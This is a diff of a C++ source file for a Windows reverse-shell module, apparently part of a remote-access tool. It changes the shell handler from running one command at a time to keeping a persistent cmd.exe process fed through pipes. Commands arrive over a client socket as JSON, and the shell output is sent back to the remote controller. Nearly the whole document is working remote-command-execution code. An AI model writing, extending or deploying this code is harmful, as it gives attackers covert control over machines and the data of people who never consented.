@@ -1,105 +1,86 @@
 #include "ReverseShell.h"
 
+// TODO UTF8 compatibility
 
-std::string ReverseShell::executeCommand(const std::wstring & command) {
-    std::array<wchar_t, 128> buffer{};
-    std::string result;
-    std::string completeCommand = "cmd /c cd "+currentDirectory+" & "+Converter::wstring2string(command)+" & echo. & cd";
-    runCmd(completeCommand,result);
-    size_t initialPos =  result.find_last_of('\n',result.find_last_not_of('\n'));
-    std::string currentDirectorySubstring =  result.substr(initialPos+1,result.length()-initialPos-2);
-    result = result.substr(0,initialPos);
-    currentDirectory = currentDirectorySubstring;
-    result.append("|"+currentDirectorySubstring);
-    return result;
+void ReverseShell::initializeCMDProcess() {
+    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, true };
+    CreatePipe(&hRead, &hWriteCmd, &sa, 0);
+    CreatePipe(&hReadCmd, &hWrite, &sa, 0);
+
+    STARTUPINFOW si = { 0 };
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.hStdInput = hRead;
+    si.hStdOutput = hWrite;
+    si.hStdError = hWrite;
+    si.dwFlags = STARTF_USESTDHANDLES;
+
+    wchar_t cmd[] = L"cmd.exe";
+    CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
 }
 
+void ReverseShell::runCommand(nlohmann::json jsonObject) {
+        std::string command = jsonObject["command"];
+        command.append("\n");
+        DWORD written;
+        WriteFile(hWriteCmd, command.c_str(), command.size(), &written, NULL);
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
+}
 
+void ReverseShell::closeCMDProcess() {
+    TerminateProcess(pi.hProcess, 0);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hRead);
+    CloseHandle(hWrite);
+    CloseHandle(hReadCmd);
+    CloseHandle(hWriteCmd);
+}
 
-int ReverseShell::runCmd(const std::string &commandToExecute, std::string &outOutput) {
-    HANDLE g_hChildStd_OUT_Rd = nullptr;
-    HANDLE g_hChildStd_OUT_Wr = nullptr;
-    HANDLE g_hChildStd_ERR_Rd = nullptr;
-    HANDLE g_hChildStd_ERR_Wr = nullptr;
+void ReverseShell::readOutput() {
+    const int BUFFER_SIZE = 4096;
+    char buffer[BUFFER_SIZE];
+    std::string accumulatedOutput;
 
-    SECURITY_ATTRIBUTES sa;
-    // Set the bInheritHandle flag so pipe handles are inherited.
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.bInheritHandle = TRUE;
-    sa.lpSecurityDescriptor = nullptr;
-    if (!CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa,
-                    0)) { return 1; } // Create a pipe for the child process's STDERR.
-    if (!SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT,
-                              0)) { return 1; } // Ensure the read handle to the pipe for STDERR is not inherited.
-    if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa,
-                    0)) { return 1; } // Create a pipe for the child process's STDOUT.
-    if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT,
-                              0)) { return 1; } // Ensure the read handle to the pipe for STDOUT is not inherited
+    while (isShellOpen.load()) {
+        DWORD bytesRead;
 
-    PROCESS_INFORMATION piProcInfo;
-    STARTUPINFOW siStartInfo;
-    // Set up members of the PROCESS_INFORMATION structure.
-    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
-
-    // Set up members of the STARTUPINFO structure.
-    // This structure specifies the STDERR and STDOUT handles for redirection.
-    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
-
-    ZeroMemory(&siStartInfo, sizeof(STARTUPINFOW));  // Aquí también
-    siStartInfo.cb = sizeof(STARTUPINFOW);  // Y aquí
-    siStartInfo.hStdError = g_hChildStd_ERR_Wr;
-    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
-    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
-
-    // Create the child process.
-    CreateProcessW(
-            nullptr,
-            (LPWSTR)commandToExecute.c_str(),
-            nullptr,
-            nullptr,
-            TRUE,
-            CREATE_NO_WINDOW,
-            nullptr,
-            nullptr,
-            &siStartInfo,
-            &piProcInfo
-    );
-
-    CloseHandle(g_hChildStd_ERR_Wr);
-    CloseHandle(g_hChildStd_OUT_Wr);
-
-    // read output
-#define BUFSIZE 4096
-    DWORD dwRead;
-    WCHAR chBuf[BUFSIZE];
-    bool bSuccess = FALSE;
-    for (;;) {
-        bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, nullptr);
-        if (!bSuccess || dwRead == 0) break;
-
-        std::wstring s(chBuf, dwRead);
-        std::wcout << s << std::endl;
-        //outOutput += s;
+        if (PeekNamedPipe(hReadCmd, NULL, 0, NULL, &bytesRead, NULL) && bytesRead > 0) {
+            if (ReadFile(hReadCmd, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) {
+                buffer[bytesRead] = '\0';
+                accumulatedOutput += buffer;
+            }
+        } else {
+            if (!accumulatedOutput.empty()) {
+                nlohmann::json jsonObject;
+                jsonObject["RESPONSE"] = "SHELL";
+                jsonObject["result"] = accumulatedOutput;
+                clientSocket.sendMessage(jsonObject.dump(1, ' ',true,nlohmann::json::error_handler_t::replace));
+                accumulatedOutput.clear();
+            }
+            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+        }
     }
-    dwRead = 0;
-    std::cout << "To execute: "  << commandToExecute <<  "Output "<< outOutput << std::endl;
-
-
-    // The remaining open handles are cleaned up when this process terminates.
-    // To avoid resource leaks in a larger application,
-    // close handles explicitly.
-    return 0;
 }
+
 
 ReverseShell::ReverseShell(ClientSocket &clientSocket) : Handler(clientSocket){
     ActionMap& actionMap = clientSocket.getActionMap();
     actionMap["REVERSE_SHELL_COMMAND"]  = [&](nlohmann::json& json) {
-        threadGen.runInNewThread(this, &ReverseShell::executeCommandAndSendResult, json);
+        threadGen.runInNewThread(this, &ReverseShell::runCommand, json);
     };
-}
+    actionMap["START_REVERSE_SHELL"]  = [&](nlohmann::json& json) {
+        if (!isShellOpen.load()) {
+            isShellOpen.store(true);
+            initializeCMDProcess();
+            threadGen.runInNewThread(this, &ReverseShell::readOutput);
+        }
+    };
+    actionMap["CLOSE_REVERSE_SHELL"]  = [&](nlohmann::json& json) {
+        isShellOpen.store(false);
+        closeCMDProcess();
+    };
 
-void ReverseShell::executeCommandAndSendResult(nlohmann::json jsonObject){
-    std::string command = jsonObject["command"];
-    std::string resultOfCommand = executeCommand(Converter::string2wstring(command));
-    //stream.sendString(resultOfCommand.c_str());
+
+
 }
